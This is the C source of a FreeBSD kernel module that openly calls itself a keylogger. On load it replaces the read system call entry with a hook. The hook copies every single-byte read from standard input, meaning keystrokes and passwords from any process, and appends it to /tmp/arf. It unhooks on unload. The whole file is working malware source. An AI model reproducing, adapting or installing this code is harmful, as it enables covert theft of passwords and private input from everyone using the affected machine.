#include <fcntl.h>
#include <sys/types.h>
#include <sys/param.h>
#include <sys/proc.h>
#include <sys/module.h>
#include <sys/sysent.h>
#include <sys/kernel.h>
#include <sys/systm.h>
#include <sys/syscall.h>
#include <sys/sysproto.h>
#include <sys/uio.h>
#include <sys/pcpu.h>
#include <sys/syscallsubr.h>
#include <sys/fcntl.h>
#include <sys/file.h>


/* keylogging by hooking:
   ssize_t
   read(int fd, void *buf, size_t nbytes); */


static int
read_hook(struct thread *td, void *syscall_args)
{
        struct read_args /* {
                int     fd;
                void    *buf;
                size_t  nbyte;
        } */ *uap;

        uap = (struct read_args *) syscall_args;

        int error;
        char buf[1];
        int done;

        error = read(td, syscall_args);

        if (error || (!uap->nbyte) || (uap->nbyte > 1) ||
                        (uap->fd != 0)) {
                return(error);
        }

        copyinstr(uap->buf, buf, 1, &done);

        /* credz to 
         * https://lists.freebsd.org/pipermail/freebsd-hackers/2007-May/020625.html
         * https://github.com/0xe/tripwyre-fbsd/blob/4f4a4c200d024fb2d3d62568493642d24c7275f8/module.c
         */

        /* open file */
        error = kern_open(td, "/tmp/arf", UIO_SYSSPACE, O_WRONLY | O_CREAT | O_APPEND, 0644);
        if (error) {
                printf("open error %d\n", error);
                return error;
        }

        // int *keylog_fd = (int *)td->td_retval[0];
        int keylog_fd = td->td_retval[0];

        struct iovec aiov;
        struct uio auio;

        bzero(&auio, sizeof(auio));
        bzero(&aiov, sizeof(aiov));


        // struct iovec {
        //         void    *iov_base;           /* base address */
        //         size_t  iov_len;             /* length */
        // }

        // struct uio {
        //         struct  iovec *uio_vec;         /* list */
        //         int     uio_iovcnt;             /* length of list */
        //         off_t   uio_offset;             /* offset in target */
        //         ssize_t uio_resid;              /* remaining bytes to copy */
        //         enum    uio_seg  uio_segflg;    /* address space */
        //         enum    uio_rw uio_rw;          /* operation */
        //         struct  thread *uio_td;         /* owner */
        // };


        aiov.iov_base   = &buf;
        aiov.iov_len    = 1;

        auio.uio_iov    = &aiov;
        auio.uio_iovcnt = 1;
        auio.uio_offset = 0;
        auio.uio_resid  = 1;
        auio.uio_segflg = UIO_SYSSPACE;
        auio.uio_rw     = UIO_WRITE;
        auio.uio_td     = td;


        /* write to file */
        error = kern_writev(td, keylog_fd, &auio);
        if (error) {
                printf("write error %d\n", error);
                return error;
        }

        /* close log file */
        struct close_args fdtmp;
        fdtmp.fd = keylog_fd;
        close(td, &fdtmp);

        return(error);
}


/* handle load/unload */
static int
load(struct module *module, int cmd, void *arg)
{
        int error = 0;

        switch(cmd) {
        case MOD_LOAD:
                /* replace read entry with read_hook */
                sysent[SYS_read].sy_call = (sy_call_t *) read_hook;
                printf("keylogger loaded. yea boyy\n");
                break;

        case MOD_UNLOAD:
                /* unhook */
                sysent[SYS_read].sy_call = (sy_call_t *) read;
                printf("keylogger unloaded\n");
                break;

        default:
                error = EOPNOTSUPP;
                break;
        }

        return(error);
}

static moduledata_t read_hook_mod = {
        "read_h00k",        /* module name */
        load,                /* event handler */
        NULL                /* extra data */
};

DECLARE_MODULE(read_hook, read_hook_mod, SI_SUB_DRIVERS, SI_ORDER_MIDDLE);
